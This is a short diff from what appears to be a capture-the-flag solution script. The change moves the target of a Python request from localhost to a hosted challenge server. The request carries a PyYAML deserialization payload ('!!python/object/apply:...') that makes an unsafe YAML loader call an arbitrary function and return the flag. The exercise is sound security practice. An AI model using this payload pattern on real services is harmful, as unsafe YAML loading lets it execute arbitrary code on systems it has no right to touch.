@@ -21,6 +21,6 @@ An attacker could use this flaw to execute arbitrary code on the system by abusi
 # And that there's a module called flag containing get_flag()
 # All you have to do is to call that function in yaml
 
-r = requests.post("http://127.0.0.1:5000/post3", data={"text":"!!python/object/apply:flag.get_flag []"})
+r = requests.post("https://infreezy.pythonanywhere.com/post3", data={"text":"!!python/object/apply:flag.get_flag []"})
 print(r.text)
 # inf{D3s3r14l1Z4t10N}
